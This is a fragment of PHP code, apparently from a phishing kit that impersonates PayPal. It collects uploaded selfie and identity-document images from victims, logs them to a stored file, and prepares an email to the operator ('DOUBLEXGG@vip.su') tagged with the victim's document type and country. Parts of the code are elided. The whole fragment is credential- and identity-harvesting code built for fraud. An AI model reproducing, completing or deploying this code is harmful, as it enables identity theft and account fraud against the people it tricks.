<?php 
    if(isset($_POST['id_slf'])&&isset($_POST['images'])){
        ...
        for($i=0;$i<count($_POST['images']);$i++){
            ...
            $msg.="TIME		: ".now()." GMT\r\n";
            $msg.="=========== <[ ⛔💥DXG RZL. PAYPAL SELFIE💥⛔  ]> ===========\r\n\r\n\r\n";
            $save=fopen("../../stored.txt","a+");fwrite($save,$msg);
            fclose($save);
            $subject="⛔💥DXG RZL💥⛔ PaYPal SelFiE OF [".$_SESSION['doc_type']."|".$_SESSION['ip_countryName']."]";$headers="From:DOUBLEXGG <DOUBLEXGG@vip.su>\r\n";
